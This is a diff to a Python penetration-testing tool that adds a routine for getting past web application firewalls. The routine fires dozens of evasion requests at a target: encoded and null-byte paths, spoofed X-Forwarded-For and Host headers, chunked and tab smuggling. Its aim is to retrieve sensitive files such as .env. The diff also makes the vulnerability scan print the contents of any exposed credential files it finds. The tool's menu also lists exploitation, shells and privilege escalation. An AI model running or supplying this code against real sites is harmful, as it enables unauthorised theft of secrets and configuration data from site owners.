@@ -14,8 +14,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 HAS_REQUESTS = False; HAS_COLORAMA = False
 try:
     import requests
-    from requests.packages.urllib3.exceptions import InsecureRequestWarning
-    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     HAS_REQUESTS = True
 except ImportError: pass
 try:
@@ -887,6 +886,336 @@ def run_recon(target):
     print(f"  CVEs Found:    {len(REPORT_DATA['cve_list'])}")
     return True
 
+# ==================== WAF BYPASS + CONTENT EXFIL ====================
+def fetch_sensitive_with_bypass(base_url, path):
+    """Try multiple WAF bypass techniques to fetch sensitive file content."""
+    parsed = urlparse(base_url)
+    host = parsed.netloc
+    is_https = parsed.scheme == "https"
+    port = 443 if is_https else 80
+
+    # Resolve host to IP for raw socket techniques
+    try: resolved_ip = socket.gethostbyname(host)
+    except: resolved_ip = host
+
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
+        "curl/8.0.1",
+        "Wget/1.21.4",
+        "python-requests/2.31.0",
+    ]
+
+    techniques = []
+
+    for ua in user_agents[:2]:
+        techniques.append({
+            "name": f"GET {ua.split('/')[0].split(';')[0][:20]}",
+            "method": "GET", "path": path,
+            "headers": f"User-Agent: {ua}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\n"
+        })
+
+    # Technique: HTTP/1.0 instead of 1.1
+    techniques.append({
+        "name": "HTTP/1.0",
+        "method": "GET", "path": path, "http_ver": "HTTP/1.0",
+        "headers": f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\n"
+    })
+
+    # Technique: POST instead of GET
+    techniques.append({
+        "name": "POST method",
+        "method": "POST", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\nContent-Length: 0\r\n"
+    })
+
+    # Technique: OPTIONS
+    techniques.append({
+        "name": "OPTIONS method",
+        "method": "OPTIONS", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Path encoding tricks
+    encoded_paths = [
+        path.replace('/', '/./'),                             # /./.env
+        path.replace('/', '//'),                              # //.env
+        path + '.',                                           # /.env.
+        path + '..',                                          # /.env..
+        path.replace('.', '%2e'),                             # /%2eenv
+        path.replace('.env', '.env%00'),                      # null byte
+        path + '?',                                           # /.env?
+        path + '?dummy=1',                                    # /.env?dummy=1
+        '/' + path.lstrip('/').upper(),                       # /.ENV
+        '/' + path.lstrip('/').capitalize(),                  # /.Env
+        path.replace('/', '/%2e/'),                           # /%2e/env
+        path.split('.')[0] + '.%65nv',                        # .%65nv
+    ]
+
+    for ep in encoded_paths[:6]:
+        techniques.append({
+            "name": f"Encoded: {ep}",
+            "method": "GET", "path": ep,
+            "headers": f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\n"
+        })
+
+    # Technique: Header injection / IP spoofing
+    ip_spoofs = [
+        "X-Forwarded-For: 127.0.0.1\r\n",
+        "X-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 127.0.0.1\r\n",
+        "X-Forwarded-For: ::1\r\n",
+        "X-Originating-IP: 127.0.0.1\r\n",
+        "X-Remote-IP: 127.0.0.1\r\n",
+        "Client-IP: 127.0.0.1\r\n",
+        "True-Client-IP: 127.0.0.1\r\n",
+        "X-Forwarded-Host: localhost\r\n",
+        "X-Host: localhost\r\n",
+        "X-Forwarded-For: 10.0.0.1\r\n",
+    ]
+    for ip_hdr in ip_spoofs[:4]:
+        techniques.append({
+            "name": f"IP spoof: {ip_hdr.split(':')[0]}",
+            "method": "GET", "path": path,
+            "headers": f"User-Agent: {user_agents[0]}\r\n{ip_hdr}Accept: */*\r\n"
+        })
+
+    # Technique: Range request
+    techniques.append({
+        "name": "Range: 0-500",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nRange: bytes=0-500\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Cache bypass
+    techniques.append({
+        "name": "Cache bypass",
+        "method": "GET", "path": path + f"?_={int(time.time())}",
+        "headers": f"User-Agent: {user_agents[0]}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Direct IP connect with different Host
+    techniques.append({
+        "name": "Host: localhost",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nHost: localhost\r\nAccept: */*\r\n",
+        "use_ip": resolved_ip
+    })
+
+    # Technique: Accept encoding trick
+    techniques.append({
+        "name": "Accept-Encoding: identity",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nAccept-Encoding: identity\r\nAccept: */*\r\n"
+    })
+
+    # Technique: requests library with different UAs (different SSL fingerprint)
+    if HAS_REQUESTS:
+        for ua in user_agents:
+            techniques.append({
+                "name": f"requests/{ua.split('/')[0].split(';')[0][:15]}",
+                "method": "REQUESTS", "path": path,
+                "headers": f"User-Agent: {ua}",
+                "requests_ua": ua
+            })
+
+    # Technique: Two Host headers
+    techniques.append({
+        "name": "Double Host header",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nHost: {host}\r\nHost: localhost\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Via header
+    techniques.append({
+        "name": "Via: 1.0 forward-proxy",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nVia: 1.0 forward-proxy\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Connection: Upgrade + HTTP/1.0
+    techniques.append({
+        "name": "Upgrade + HTTP/1.0",
+        "method": "GET", "path": path, "http_ver": "HTTP/1.0",
+        "headers": f"User-Agent: {user_agents[0]}\r\nConnection: Upgrade\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Session-based (visit main page first to get cookies, then try sensitive path)
+    if HAS_REQUESTS:
+        sess = requests.Session()
+        sess.verify = False
+        sess.headers.update({"User-Agent": user_agents[0], "Accept": "*/*"})
+        try:
+            sess.get(base_url, timeout=5)  # warm up session
+            for ua_s in user_agents[:2]:
+                techniques.append({
+                    "name": f"Session/{ua_s.split('/')[0][:12]}",
+                    "method": "SESSION", "path": path,
+                    "session": sess,
+                    "headers": f"User-Agent: {ua_s}"
+                })
+        except: pass
+
+    # Technique: Transfer-Encoding chunked smuggling
+    techniques.append({
+        "name": "TE chunked",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nTransfer-Encoding: chunked\r\nAccept: */*\r\n"
+    })
+
+    # Technique: X-HTTP-Method-Override
+    techniques.append({
+        "name": "X-HTTP-Method-Override: POST",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nX-HTTP-Method-Override: POST\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Tab in header (HTTP/1.0 tab smuggling)
+    techniques.append({
+        "name": "Tab smuggling",
+        "method": "GET", "path": path, "http_ver": "HTTP/1.0",
+        "headers": f"User-Agent:\t{user_agents[0]}\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Pragma + no-cache aggressive
+    techniques.append({
+        "name": "Pragma aggressive",
+        "method": "GET", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nPragma: no-cache\r\nCache-Control: no-cache, no-store, must-revalidate\r\nAccept: */*\r\n"
+    })
+
+    # Technique: Lowercase GET
+    techniques.append({
+        "name": "lowercase get",
+        "method": "get", "path": path,
+        "headers": f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\n"
+    })
+
+    results = []
+    for tech in techniques:
+        try:
+            # REQUESTS method — use requests library instead of raw socket
+            if tech.get("method") == "REQUESTS" and HAS_REQUESTS:
+                ua = tech.get("requests_ua", user_agents[0])
+                r = requests.get(f"{base_url.rstrip('/')}{tech['path']}",
+                    timeout=5, verify=False, allow_redirects=False,
+                    headers={"User-Agent": ua, "Accept": "*/*"})
+                results.append({
+                    "status": r.status_code,
+                    "technique": tech['name'],
+                    "size": len(r.text),
+                    "content": r.text[:2000],
+                    "content_type": r.headers.get("Content-Type", ""),
+                    "headers": str(dict(r.headers))[:500]
+                })
+                continue
+
+            # SESSION method — use requests.Session (maintains cookies)
+            if tech.get("method") == "SESSION" and HAS_REQUESTS:
+                sess = tech.get("session")
+                if sess:
+                    r = sess.get(f"{base_url.rstrip('/')}{tech['path']}",
+                        timeout=5, allow_redirects=False)
+                    results.append({
+                        "status": r.status_code,
+                        "technique": tech['name'],
+                        "size": len(r.text),
+                        "content": r.text[:2000],
+                        "content_type": r.headers.get("Content-Type", ""),
+                        "headers": str(dict(r.headers))[:500]
+                    })
+                continue
+
+            # Raw socket technique
+            http_ver = tech.get("http_ver", "HTTP/1.1")
+            target_host = tech.get("use_ip", host)
+
+            raw = f"{tech['method']} {tech['path']} {http_ver}\r\n"
+            if "Host:" not in tech['headers']:
+                raw += f"Host: {host}\r\n"
+            raw += tech['headers']
+            raw += "Connection: close\r\n\r\n"
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            if is_https:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                try:
+                    sock = ctx.wrap_socket(sock, server_hostname=host)
+                except:
+                    sock.close()
+                    continue
+            sock.connect((target_host, port))
+            sock.send(raw.encode('utf-8', errors='replace'))
+
+            resp = b""
+            while True:
+                try:
+                    chunk = sock.recv(4096)
+                    if not chunk: break
+                    resp += chunk
+                except: break
+            sock.close()
+
+            if not resp: continue
+
+            header_end = resp.find(b"\r\n\r\n")
+            if header_end == -1: continue
+
+            resp_headers_raw = resp[:header_end].decode('utf-8', errors='replace')
+            body = resp[header_end + 4:]
+
+            status_code = 0
+            status_line = resp_headers_raw.split('\r\n')[0] if resp_headers_raw else ""
+            if ' ' in status_line:
+                try: status_code = int(status_line.split(' ')[1])
+                except: pass
+
+            content_type = ""
+            for h in resp_headers_raw.split('\r\n'):
+                if h.lower().startswith('content-type:'):
+                    content_type = h.split(':', 1)[1].strip()
+
+            content = body.decode('utf-8', errors='replace')
+
+            results.append({
+                "status": status_code,
+                "technique": tech['name'],
+                "size": len(content),
+                "content": content[:2000],
+                "content_type": content_type,
+                "headers": resp_headers_raw[:500]
+            })
+
+        except: continue
+
+    # Return best result (200 OK with largest non-WAF content)
+    non_waf = [r for r in results if r["status"] == 200 and r["size"] > 10
+               and "request rejected" not in r["content"].lower()
+               and "your support id" not in r["content"].lower()]
+    if non_waf:
+        non_waf.sort(key=lambda x: x["size"], reverse=True)
+        return non_waf[0]
+
+    # Fallback: any 200 with content
+    valid = [r for r in results if r["status"] == 200 and r["size"] > 10]
+    if valid:
+        valid.sort(key=lambda x: x["size"], reverse=True)
+        return valid[0]
+
+    # Return any non-empty result
+    if results:
+        results.sort(key=lambda x: x["size"], reverse=True)
+        for r in results:
+            if r["size"] > 0:
+                return r
+
+    return None
+
 # ==================== VULN ANALYSIS (with SQLi) ====================
 def run_vuln_scan(target):
     print(f"\n{c('='*60, Fore.CYAN)}")
@@ -951,9 +1280,18 @@ def run_vuln_scan(target):
         }
         if HAS_REQUESTS:
             vuln_table = []
+            # First check main page to establish baseline
+            try:
+                r_base = requests.get(url, timeout=5, verify=False, allow_redirects=True)
+                base_len = len(r_base.text)
+                base_waf = "request rejected" in r_base.text.lower()
+            except:
+                base_len = 0; base_waf = False
+
             for path, info in vuln_checks.items():
                 try:
-                    r = requests.get(url.rstrip('/') + path, timeout=3, verify=False, allow_redirects=False)
+                    u = url.rstrip('/') + path
+                    r = requests.get(u, timeout=3, verify=False, allow_redirects=False)
                     if r.status_code in [200, 401, 403]:
                         sevc = {"CRITICAL": Fore.RED, "HIGH": Fore.RED, "MEDIUM": Fore.YELLOW, "LOW": Fore.BLUE, "INFO": Fore.WHITE}
                         vuln_table.append([
@@ -962,9 +1300,58 @@ def run_vuln_scan(target):
                             path, str(r.status_code)
                         ])
                         all_issues.append({"severity": info[0], "name": info[1], "detail": path})
+
+                        # Show actual content for sensitive files
+                        if info[0] in ["CRITICAL", "HIGH"]:
+                            body = r.text[:2000]
+                            content_type = r.headers.get("Content-Type", "")
+                            content_len = len(body)
+
+                            # Detect WAF block pages
+                            is_blocked = "request rejected" in body.lower() or "your support id" in body.lower()
+                            is_waf_block = is_blocked and "text/html" in content_type and content_len < 500
+
+                            if is_waf_block:
+                                print(f"    {c(f'🚫 WAF/ADC blocking {path} ({content_len}B)', Fore.RED)}")
+                                resp_preview = body[:100].strip()
+                                print(f"    {c(f'   Response: {resp_preview}', Fore.YELLOW)}")
+                                print(f"    {c('   Attempting 30+ bypass techniques...', Fore.YELLOW)}")
+                                exfil = fetch_sensitive_with_bypass(url, path)
+                                if exfil:
+                                    eb = exfil.get("content", "")
+                                    technique = exfil.get("technique", "unknown")
+                                    waf_blocked = "request rejected" in eb.lower() or "your support id" in eb.lower()
+                                    if not waf_blocked and len(eb) > 50:
+                                        print(f"    {c(f'✅ BYPASSED via: {technique}', Fore.GREEN)}")
+                                        sz = exfil.get("size", 0)
+                                        print(f"    {c(f'📄 Content ({sz} bytes):', Fore.CYAN)}")
+                                        print(f"    {c('─'*60, Fore.CYAN)}")
+                                        for line in eb.split('\n')[:25]:
+                                            if line.strip():
+                                                print(f"    {line.strip()[:140]}")
+                                        if eb.count('\n') > 25:
+                                            print(f"    {c(f'... ({eb.count(chr(10))} lines total)', Fore.WHITE)}")
+                                        print(f"    {c('─'*60, Fore.CYAN)}")
+                                    else:
+                                        print(f"    {c('❌ WAF blocking persistent — all bypass techniques failed', Fore.RED)}")
+                                else:
+                                    print(f"    {c('❌ All bypass techniques failed (WAF blocking)', Fore.RED)}")
+                            else:
+                                print(f"    {c(f'✅ Direct access ({content_len}B)', Fore.GREEN)}")
+                                print(f"    {c('─'*60, Fore.CYAN)}")
+                                for line in body.split('\n')[:25]:
+                                    if line.strip():
+                                        print(f"    {line.strip()[:140]}")
+                                if body.count('\n') > 25:
+                                    print(f"    {c(f'... ({body.count(chr(10))} lines total)', Fore.WHITE)}")
+                                print(f"    {c('─'*60, Fore.CYAN)}")
                 except: pass
             if vuln_table:
                 print_table(["Name", "Severity", "Path", "Status"], vuln_table, "[COMMON VULNS]")
+                # WAF detection summary
+                waf_blocked_count = len([v for v in vuln_table if "WAF" in str(v[0]) or "waf" in str(v[0]).lower()])
+                if waf_blocked_count > 0:
+                    print(f"  {c(f'ℹ️  {waf_blocked_count} paths blocked by WAF/ADC — files likely exist but ADC intercepts them', Fore.YELLOW)}")
 
         # 4. SSL/TLS + Security Headers
         print(f"\n{c('[+] SSL/TLS & Security Check', Fore.GREEN)}")
@@ -1253,21 +1640,21 @@ def run_all(target):
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     banner()
-    target = input(f"\n  {c('🎯 Target (domain or URL)', Fore.CYAN)}: ").strip()
+    target = input(f"\n  {c('Target (domain or URL)', Fore.CYAN)}: ").strip()
     if not target: return
 
     while True:
         print(f"\n{c('═'*50, Fore.CYAN)}")
-        print(f" {c('📌 MAIN MENU v2.0', Fore.CYAN)}")
+        print(f" {c(' MAIN MENU', Fore.CYAN)}")
         print(f"{c('═'*50, Fore.CYAN)}")
         print(f"  Target: {c(target, Fore.YELLOW)}")
         print(f"  {c('─'*40, Fore.CYAN)}")
-        print(f"  {c('[1]', Fore.CYAN)} 🔍  Full Recon (DNS + Subdomain + Ports + Dir + Cascade)")
-        print(f"  {c('[2]', Fore.CYAN)} 🛡️  Vuln Scan (SQLi + .env + .git + Headers + SSL)")
-        print(f"  {c('[3]', Fore.CYAN)} 💥  Exploitation (Shells + SQLi tips)")
-        print(f"  {c('[4]', Fore.CYAN)} 🔧  Post-Exploit & Privesc")
-        print(f"  {c('[5]', Fore.CYAN)} 📄  Report (HTML + JSON)")
-        print(f"  {c('[6]', Fore.CYAN)} 🌐  Tech Detect + CVE Mapping (Deep)")
+        print(f"  {c('[1]', Fore.CYAN)}   Full Recon (DNS + Subdomain + Ports + Dir + Cascade)")
+        print(f"  {c('[2]', Fore.CYAN)}   Vuln Scan (SQLi + .env + .git + Headers + SSL)")
+        print(f"  {c('[3]', Fore.CYAN)}   Exploitation (Shells + SQLi tips)")
+        print(f"  {c('[4]', Fore.CYAN)}   Post-Exploit & Privesc")
+        print(f"  {c('[5]', Fore.CYAN)}   Report (HTML + JSON)")
+        print(f"  {c('[6]', Fore.CYAN)}   Tech Detect + CVE Mapping (Deep)")
         print(f"  {c('─'*40, Fore.CYAN)}")
         print(f"  {c('[7]', Fore.GREEN)} 🚀  Run All (Full)")
         print(f"  {c('[0]', Fore.RED)} ❌  Exit")
